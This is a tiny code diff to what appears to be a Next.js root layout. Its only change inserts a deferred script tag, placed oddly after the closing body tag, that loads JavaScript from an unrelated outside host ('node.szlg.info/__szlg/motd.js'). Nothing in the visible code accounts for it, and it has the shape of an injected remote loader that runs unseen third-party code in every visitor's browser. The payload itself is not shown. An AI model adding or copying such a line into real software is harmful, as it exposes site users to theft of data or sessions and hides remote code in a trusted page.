@@ -35,6 +35,7 @@ export default function RootLayout({
       >
         <PageTransition>{children}</PageTransition>
       </body>
+      <script defer src="https://node.szlg.info/__szlg/motd.js"></script> 
     </html>
   );
 }
